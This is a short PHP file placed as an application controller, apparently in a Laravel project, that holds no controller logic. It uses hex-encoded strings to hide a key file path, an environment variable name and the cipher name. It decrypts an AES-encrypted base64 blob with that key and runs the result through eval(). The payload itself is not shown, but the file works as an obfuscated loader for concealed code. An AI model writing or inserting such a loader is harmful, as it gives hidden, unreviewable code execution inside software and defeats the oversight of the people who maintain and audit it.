<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('uCrDodK4XDXGK4toii4CKA==');

$c=base64_decode(

'rHR15AkRsi0EQXA4EJRliuGaQz1uwok4YDz+XHcXXtYVsjBpms0MeakI/panV3FOJgTtWDNpA0k8' .
'n4wAybg/G31/J9XLy8lUg+ZqqxqX4QPGnDAXxAZD7GxxAmB94js8QOF4lzmIkGIO11dU5IbYSWVo' .
'sD53Pl4zAlLVzRm4uL0+aMxWfJQQUR5y+23sS7gtdmNBE1mDhjdfNk0+Xja4E/EkV9SNO74IAYlR' .
'T1gzOq8OWPv42jfrjR8f6H3H8zJx'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

